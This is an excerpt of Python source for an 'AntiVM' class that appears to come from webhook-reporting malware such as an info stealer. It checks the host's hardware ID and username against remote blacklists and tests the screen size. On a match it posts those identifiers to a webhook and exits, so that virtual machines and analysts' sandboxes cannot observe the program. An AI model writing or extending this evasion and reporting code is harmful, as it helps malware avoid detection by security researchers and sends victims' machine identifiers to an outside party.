...
class AntiVM:
    ...
    def CheckLists(self) -> None:
        try:
            if UserInfo.HWID in self.hwidlist.text:
                self.webhook.send(
                    f"**Blacklisted HWID Detected. HWID:** `{UserInfo.HWID}`", "Anti VM"
                )
                os._exit(1)
        except:
        ...
        try:
            if UserInfo.USERNAME in self.pcusernamelist.text:
                self.webhook.send(
                    f"**Blacklisted PC User:** `{UserInfo.USERNAME}`", "Anti VM"
                )
                os._exit(1)
        except:
            self.webhook.send("[ERROR]: Failed to connect to database.", "Anti VM")
    ...
    def CheckScreenSize(self) -> None:
        ...
        if x <= 200 or y <= 200:
            self.webhook.send(f"Screen Size Is: **x**: {x} | **y**: {y}", "Anti VM")
            os._exit(1)
